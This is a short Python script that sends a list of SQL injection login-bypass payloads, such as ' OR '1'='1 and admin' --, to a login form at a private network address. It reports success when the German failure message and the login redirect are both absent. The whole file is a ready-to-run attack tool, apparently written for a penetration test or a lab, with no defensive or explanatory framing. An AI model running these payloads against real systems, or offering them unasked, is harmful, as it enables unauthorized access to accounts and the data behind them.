# sqli_test_login.py
import requests

BASE = "http://192.168.2.209:5000"  # change if needed 
LOGIN = BASE + "/login"

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "' OR 1=1 -- ",
    "\" OR \"1\"=\"1",
    "admin' -- ",
    "admin'#",
    "' OR ''='",
    "' OR 'x'='x",
    "' OR '1'='1' LIMIT 1; --"
]

s = requests.Session()

for p in payloads:
    data = {"username": p, "password": "test"}
    res = s.post(LOGIN, data=data, allow_redirects=True, timeout=10)
    text = res.text.lower()
    # crude heuristic: if the page doesn't contain "login fehlgeschlagen" and redirects to /, likely success
    if "login fehlgeschlagen" not in text and res.url.rstrip("/") != LOGIN:
        print("POTENTIAL SUCCESS for payload:", repr(p))
        print("Final URL:", res.url)
        # show short snippet
        print(res.text[:400])
        break
    else:
        print("Nope:", repr(p))
else:
    print("No payload succeeded (based on heuristics).")
